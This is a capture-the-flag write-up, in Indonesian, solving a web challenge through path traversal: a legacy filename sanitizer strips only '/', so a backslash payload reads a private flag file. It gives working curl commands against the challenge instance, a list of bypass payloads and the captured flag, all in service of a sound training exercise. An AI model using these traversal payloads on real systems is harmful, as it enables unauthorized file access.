# Upload Lantern — SOLVED

**Flag:** `athena{KmKJUQLcx9MkWXeS}`

- **Category:** INFRA (hard, 350) · instance HTTP `http://13.206.57.188:<port>`
- **Vuln:** Path traversal via **backslash**, karena production pakai *legacy* sanitizer yang cuma buang `/`.

## Analisa kode
- `config.py` aktifin sanitizer LAMA: `from upload_handler import sanitize_legacy as sanitize_filename`
  (v2 `sanitizer.py` yang aman di-comment out).
- `sanitize_legacy()` = `filename.replace("/", "").strip()` → **cuma buang forward slash**.
  Gak buang `\`, gak collapse `..`. (v2 buang dua-duanya + loop `..` → makanya aman & sengaja dimatiin.)
- Flag di `/srv/app/private/private_flag.txt` (satu level di atas `UPLOAD_ROOT=/srv/app/uploads`, dari `tree.txt`).

## Bypass
- `../private/...` → GAGAL: `/view` juga sanitize, `/` kebuang.
- **`..\private\private_flag.txt`** → BERHASIL: backslash lolos sanitizer (cuma `/` yang dibuang),
  dan layer path handling nge-normalize `\`→`/` (tema "Windows servers") SETELAH sanitize → traversal jalan.

## Exploit
```bash
B=http://13.206.57.188:10039
curl -sG "$B/view" --data-urlencode 'name=..\private\private_flag.txt'
# -> athena{KmKJUQLcx9MkWXeS}

# atau URL-encoded backslash:
curl -s "$B/view?name=..%5cprivate%5cprivate_flag.txt"
```

## Kenapa payload lain gagal
`../`, `%2f`, `%252f`, `%c0%af`, absolute `/srv/...`, `....//` semua kena strip `/` → 404.
Cuma jalur `\` (raw atau `%5c`) yang lolos.
